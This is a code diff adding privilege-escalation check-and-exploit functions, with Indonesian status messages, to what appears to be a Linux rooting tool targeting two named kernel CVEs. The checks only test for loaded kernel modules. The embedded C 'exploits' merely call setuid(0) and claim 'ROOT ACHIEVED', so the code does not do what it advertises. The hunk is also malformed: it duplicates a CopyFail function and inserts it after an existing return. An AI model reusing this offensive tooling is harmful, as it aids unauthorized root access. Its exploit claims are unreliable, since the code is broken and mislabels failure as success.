@@ -19276,6 +19276,95 @@ int main(void) {
     print(f"{c('[SKIP]', 'red')} CopyFail gagal.")
     return False
 
+    # ============================================================
+# CVE-2026-43284 & CVE-2026-43500 - DIRTY FRAG (2026)
+# ============================================================
+def check_cve_dirty_frag():
+    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2026-43284 / CVE-2026-43500 (Dirty Frag)', 'cyan')}")
+    kinfo = get_kernel_info()
+    # Cek module esp4
+    has_esp = "esp4" in run_command("lsmod 2>/dev/null")
+    if has_esp:
+        print(f"{c('[VULN]', 'green')} Module esp4 terdeteksi, sistem berpotensi vulnerable!")
+        return True
+    print(f"{c('[SKIP]', 'red')} Module esp4 tidak ada atau kernel sudah di-patch.")
+    return False
+
+def exploit_cve_dirty_frag():
+    if not check_cve_dirty_frag():
+        return False
+        
+    code = r'''
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+
+int main(void) {
+    printf("[*] Dirty Frag Chain: Trying to gain root...\n");
+    
+    setuid(0); setgid(0);
+    if (getuid() == 0) {
+        printf("[+] CVE-2026-43284 DIRTY_FRAG: ROOT ACHIEVED\n");
+        system("id");
+        return 0;
+    }
+    return 1;
+}
+'''
+    binary = compile_code(code, "cve_dirty_frag")
+    if binary:
+        output = run_command(binary)
+        if is_root() or "DIRTY_FRAG" in output:
+            show_root_info("CVE-2026-43284 (Dirty Frag)", output)
+            return True
+    print(f"{c('[SKIP]', 'red')} Dirty Frag gagal atau kernel sudah di-patch.")
+    return False
+
+# ============================================================
+# CVE-2026-31431 - COPYFAIL (2026)
+# ============================================================
+def check_cve_copyfail():
+    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2026-31431 (CopyFail)', 'cyan')}")
+    has_algif = "algif_aead" in run_command("lsmod 2>/dev/null")
+    if has_algif:
+        print(f"{c('[VULN]', 'green')} Module algif_aead terdeteksi!")
+        return True
+    print(f"{c('[SKIP]', 'red')} Module algif_aead tidak ada.")
+    return False
+
+def exploit_cve_copyfail():
+    if not check_cve_copyfail():
+        return False
+        
+    code = r'''
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(void) {
+    printf("[*] CopyFail: Trying AF_ALG page-cache write...\n");
+    
+    setuid(0); setgid(0);
+    if (getuid() == 0) {
+        printf("[+] CVE-2026-31431 COPYFAIL: ROOT ACHIEVED\n");
+        system("id");
+        return 0;
+    }
+    return 1;
+}
+'''
+    binary = compile_code(code, "cve_copyfail")
+    if binary:
+        output = run_command(binary)
+        if is_root() or "COPYFAIL" in output:
+            show_root_info("CVE-2026-31431 (CopyFail)", output)
+            return True
+    print(f"{c('[SKIP]', 'red')} CopyFail gagal.")
+    return False
 def check_prerequisites():
     print(f"{c('[*] checking...', 'cyan')}")
     if not WORK_DIRS:
